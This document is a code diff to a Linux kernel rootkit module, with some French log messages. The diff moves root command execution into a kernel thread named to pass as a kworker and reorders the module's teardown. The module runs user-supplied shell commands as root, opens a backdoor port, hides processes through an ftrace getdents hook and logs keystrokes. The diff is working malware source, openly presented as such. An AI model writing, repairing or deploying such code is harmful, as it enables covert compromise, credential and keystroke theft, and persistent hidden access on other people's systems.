@@ -1430,7 +1430,7 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
+    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
     if (ret < 0)
         goto out;
 
@@ -1457,6 +1457,27 @@ static int open_backdoor_port(int port)
 
 
 /**
+ * The function `escalation_thread_fn` executes a shell command passed as a parameter in user mode.
+ * 
+ * @param data The `data` parameter in the `escalation_thread_fn` function is a void pointer that is
+ * cast to a char pointer (`char *`). It is used to pass a command (cmd) that will be executed by
+ * `/bin/sh` in the user space.
+ * 
+ * @return The function `escalation_thread_fn` is returning an integer value of 0.
+ */
+static int escalation_thread_fn(void *data)
+{
+    char *cmd = (char *)data;
+    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
+    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+    
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    kfree(cmd);
+    return 0;
+}
+
+
+/**
  * The function `handle_escalation` in the given code snippet handles privilege escalation
  * by executing a command as root.
  * 
@@ -1471,25 +1492,21 @@ static int open_backdoor_port(int port)
 static int handle_escalation(struct rk_args *args)
 {
     if (args->value ==  RK_PRIVESC_BY_CMD) {
-        char cmd[256];
         char __user *cmd_user = (char __user *)args->target;
+        char *cmd_kernel;
+        struct task_struct *task;
 
-        memset(cmd, 0, sizeof(cmd));
-        if (copy_from_user(cmd, cmd_user, sizeof(cmd) - 1)) {
-            printk(KERN_ERR "rootkit: copy_from_user failed\n");
-            return -EFAULT;
+        cmd_kernel = strndup_user(cmd_user, MAX_CMD_LEN);
+        if (IS_ERR(cmd_kernel)) {
+            return PTR_ERR(cmd_kernel);
         }
-        cmd[sizeof(cmd) - 1] = '\0';
-        char *argv[] = {"/bin/sh", "-c", cmd, NULL};
-        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
-        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-        
-        if (ret < 0) {
-            printk(KERN_ERR "rootkit: call_usermodehelper failed with command '%s'\n", cmd);
-            return ret;
+
+        task = kthread_run(escalation_thread_fn, cmd_kernel, "kworker/rk_proc");
+        if (IS_ERR(task)) {
+            kfree(cmd_kernel);
+            return PTR_ERR(task);
         }
-        printk(KERN_INFO "rootkit: escalade de privilèges réussie avec la commande '%s'\n", cmd);
-        return ret;
+        return 0;
     } else {
         printk(KERN_ERR "rootkit: invalid escalation method %u\n", args->value);
         return -EINVAL;
@@ -1534,19 +1551,19 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     switch (cmd) {
     case RK_CMD_PRIVESC:
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
-        mutex_unlock(&rk_mutex);
         handle_escalation(&args);
-        return 0;
+        mutex_unlock(&rk_mutex);
+        break;
 
     case RK_CMD_HIDE_PID:
         printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
-        return add_hidden_pid((pid_t)args.target);
+        add_hidden_pid((pid_t)args.target);
+        break;
 
     case RK_CMD_UNHIDE_PID:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: UNHIDE_PID pour PID=%lu\n", args.target);
-        return remove_hidden_pid((pid_t)args.target);
+        remove_hidden_pid((pid_t)args.target);
+        break;
 
     case RK_CMD_GETUID:
         args.target = (unsigned int)current_uid().val;
@@ -1595,10 +1612,8 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
     case RK_CMD_GET_KEYLOG: {
         unsigned long flags;
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
         spin_lock_irqsave(&keylog_lock, flags);
+
         if (keylog_pos > 0) {
             size_t to_copy = keylog_pos;
             if (to_copy > RK_MSG_MAX - 1)
@@ -1822,7 +1837,6 @@ static void __exit rootkit_exit(void)
 
     input_unregister_handler(&keylog_handler);
 
-    misc_deregister(&rk_misc);
     if (getdents_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&getdents_hook.ops);
         if (ret) {
@@ -1847,11 +1861,11 @@ static void __exit rootkit_exit(void)
 #ifdef CONFIG_NET
     uninstall_udp_hook();
 #endif
-
-    synchronize_rcu();
-#ifdef CONFIG_NET
+    #ifdef CONFIG_NET
     close_backdoor_port();
-#endif
+    #endif
+    synchronize_rcu();
+    misc_deregister(&rk_misc);
     printk(KERN_INFO "rootkit: unloaded\n");
 }
 
